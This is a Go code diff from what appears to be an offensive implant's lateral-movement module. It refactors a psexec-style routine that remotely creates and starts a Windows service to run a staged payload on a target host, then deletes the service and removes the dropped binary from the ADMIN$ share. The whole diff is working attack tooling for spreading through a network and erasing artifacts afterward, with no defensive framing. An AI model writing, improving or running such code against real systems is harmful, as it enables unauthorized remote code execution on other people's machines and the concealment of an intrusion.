@@ -138,18 +138,20 @@ func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binar
 	binPath := buildWindowsCmdLine(append([]string{localPath}, lateralServiceArguments(payload.Stage, targetSession, cfg.BaseURL)...))
 	// The service is not marked for deletion here; this caller removes it
 	// below once the linked worker has completed successfully.
-	if err := scmStartService(payload.Host, serviceName, binPath, false); err != nil {
+	handles, err := scmStartServiceRetained(payload.Host, serviceName, binPath, false)
+	if err != nil {
 		return "", err
 	}
+	defer handles.close()
 	ack := fmt.Sprintf("lateral started: method=psexec host=%s target session=%s service=%s binary=%s",
 		payload.Host, targetSession, serviceName, binaryName)
 	if publish != nil {
 		publish(ack)
 	}
-	if err := waitStage1Stopped(payload.Host, serviceName, time.Duration(payload.TimeoutSeconds*float64(time.Second))-time.Since(startedAt)); err != nil {
+	if err := waitStage1ServiceStopped(handles.service, time.Duration(payload.TimeoutSeconds*float64(time.Second))-time.Since(startedAt)); err != nil {
 		var failed *launcherFailure
 		if errors.As(err, &failed) {
-			cleanup, cleanupErr := lateralCleanup(lateralCleanupPayload{Host: payload.Host, ServiceName: serviceName, BinaryName: binaryName})
+			cleanup, cleanupErr := lateralCleanupStopped(lateralCleanupPayload{Host: payload.Host, ServiceName: serviceName, BinaryName: binaryName}, handles.delete)
 			if cleanupErr != nil {
 				cleanup = "lateral cleanup pending: " + cleanupErr.Error()
 			}
@@ -157,7 +159,7 @@ func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binar
 		}
 		return ack + "\nlateral cleanup pending: " + err.Error(), nil
 	}
-	cleanup, err := lateralCleanup(lateralCleanupPayload{Host: payload.Host, ServiceName: serviceName, BinaryName: binaryName})
+	cleanup, err := lateralCleanupStopped(lateralCleanupPayload{Host: payload.Host, ServiceName: serviceName, BinaryName: binaryName}, handles.delete)
 	if err != nil {
 		return ack + "\nlateral cleanup pending: " + err.Error(), nil
 	}
@@ -196,6 +198,12 @@ func waitStage1Stopped(host, name string, timeout time.Duration) error {
 	}
 	debugEvent("scm.wait.open_service.complete", nil)
 	defer procCloseServiceHandle.Call(service)
+	return waitStage1ServiceStopped(service, timeout)
+}
+
+// waitStage1ServiceStopped polls an existing handle without reconnecting to SCM.
+func waitStage1ServiceStopped(service uintptr, timeout time.Duration) error {
+	debugEvent("scm.wait_stopped.begin", nil)
 	deadline := time.Now().Add(timeout)
 	for {
 		var status struct{ serviceType, state, accepted, exitCode, specificCode, checkpoint, waitHint uint32 }
@@ -224,27 +232,71 @@ func waitStage1Stopped(host, name string, timeout time.Duration) error {
 // deletion immediately (removed once the process stops); the psexec module
 // leaves the entry in place so the cleanup command owns its removal.
 func scmStartService(host, serviceName, binPath string, markForDeletion bool) error {
+	handles, err := scmStartServiceRetained(host, serviceName, binPath, markForDeletion)
+	if err != nil {
+		return err
+	}
+	defer handles.close()
+	return handles.close()
+}
+
+// closeSCMHandle exposes native close failures to retained-handle cleanup.
+func closeSCMHandle(handle uintptr) error {
+	debugEvent("scm.close_handle.begin", nil)
+	ok, _, callErr := procCloseServiceHandle.Call(handle)
+	if ok == 0 {
+		debugEvent("scm.close_handle.failed", callErr)
+		return fmt.Errorf("close SCM handle: %w", callErr)
+	}
+	debugEvent("scm.close_handle.complete", nil)
+	return nil
+}
+
+// deleteSCMService marks the service referenced by an existing handle for deletion.
+func deleteSCMService(handle uintptr) error {
+	debugEvent("scm.delete_service.begin", nil)
+	deleted, _, callErr := procDeleteService.Call(handle)
+	if deleted == 0 {
+		debugEvent("scm.delete_service.failed", callErr)
+		return fmt.Errorf("delete service: %w", callErr)
+	}
+	debugEvent("scm.delete_service.complete", nil)
+	return nil
+}
+
+// scmStartServiceRetained transfers the started service and manager handles to
+// its caller. Errors close both handles; native calls stay on the pinned worker.
+func scmStartServiceRetained(host, serviceName, binPath string, markForDeletion bool) (result *scmServiceHandles, resultErr error) {
 	var machinePtr *uint16
 	if host != "" {
 		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
 		if err != nil {
-			return fmt.Errorf("encode host: %w", err)
+			return nil, fmt.Errorf("encode host: %w", err)
 		}
 		machinePtr = pointer
 	}
 	// Convert inside Call so Go retains the hostname for the native call.
+	debugEvent("scm.start.open_manager.begin", nil)
 	scm, _, callErr := procOpenSCManagerW.Call(uintptr(unsafe.Pointer(machinePtr)), 0, scManagerAllAccess)
 	if scm == 0 {
-		return fmt.Errorf("open SC manager on %s: %w", host, callErr)
+		debugEvent("scm.start.open_manager.failed", callErr)
+		return nil, fmt.Errorf("open SC manager on %s: %w", host, callErr)
 	}
-	defer procCloseServiceHandle.Call(scm)
+	debugEvent("scm.start.open_manager.complete", nil)
+	handles := &scmServiceHandles{manager: scm, closeHandle: closeSCMHandle, deleteService: deleteSCMService}
+	retained := false
+	defer func() {
+		if !retained {
+			resultErr = errors.Join(resultErr, handles.close())
+		}
+	}()
 	namePtr, err := syscall.UTF16PtrFromString(serviceName)
 	if err != nil {
-		return fmt.Errorf("encode service name: %w", err)
+		return nil, fmt.Errorf("encode service name: %w", err)
 	}
 	binPtr, err := syscall.UTF16PtrFromString(binPath)
 	if err != nil {
-		return fmt.Errorf("encode service binary: %w", err)
+		return nil, fmt.Errorf("encode service binary: %w", err)
 	}
 	service, _, callErr := procCreateServiceW.Call(
 		scm,
@@ -258,17 +310,18 @@ func scmStartService(host, serviceName, binPath string, markForDeletion bool) er
 		0, 0, 0, 0, 0, 0,
 	)
 	if service == 0 {
-		return fmt.Errorf("create service on %s: %w", host, callErr)
+		return nil, fmt.Errorf("create service on %s: %w", host, callErr)
 	}
-	defer procCloseServiceHandle.Call(service)
+	handles.service = service
 	started, _, callErr := procStartServiceW.Call(service, 0, 0)
 	if markForDeletion {
 		procDeleteService.Call(service)
 	}
 	if err := serviceStartOutcome(started != 0, callErr); err != nil {
-		return fmt.Errorf("start service on %s: %w", host, err)
+		return nil, fmt.Errorf("start service on %s: %w", host, err)
 	}
-	return nil
+	retained = true
+	return handles, nil
 }
 
 // scmDeleteService removes a service on the target host; a missing service
@@ -381,7 +434,16 @@ func lateralCleanup(payload lateralCleanupPayload) (string, error) {
 			return "", err
 		}
 	}
-	serviceDeleted, serviceErr := scmDeleteService(payload.Host, payload.ServiceName)
+	return lateralCleanupStopped(payload, func() (bool, error) {
+		return scmDeleteService(payload.Host, payload.ServiceName)
+	})
+}
+
+// lateralCleanupStopped removes artifacts after a caller has established that
+// the worker stopped. The deletion callback can reuse the original SCM handle.
+func lateralCleanupStopped(payload lateralCleanupPayload, deleteService func() (bool, error)) (string, error) {
+	debugEvent("lateral.cleanup.begin", nil)
+	serviceDeleted, serviceErr := deleteService()
 	debugEvent("lateral.cleanup.service_delete.returned", serviceErr)
 	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + payload.BinaryName
 	debugEvent("lateral.cleanup.remove_file.begin", nil)
